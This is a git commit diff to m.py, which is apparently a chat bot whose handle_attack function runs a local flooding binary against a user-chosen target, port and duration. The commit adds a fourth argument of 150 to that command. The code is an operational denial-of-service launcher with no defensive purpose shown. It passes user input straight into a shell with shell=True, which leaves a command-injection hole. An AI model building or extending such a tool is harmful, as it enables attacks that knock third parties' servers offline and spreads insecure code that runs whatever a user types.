41671517403f46f09c030ab1074791ffc72c20fb
RAVISINGHBOT14 <rs9953523.ai@gmail.com>
2025-03-01 12:44:30 +0530

    m.py

--- m.py
+++ m.py
@@ -165,7 +165,7 @@ def handle_attack(message):
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./m {target} {port} {time_duration}"
+    full_command = f"./m {target} {port} {time_duration} 150"
 
     try:
         subprocess.run(full_command, shell=True, check=True)
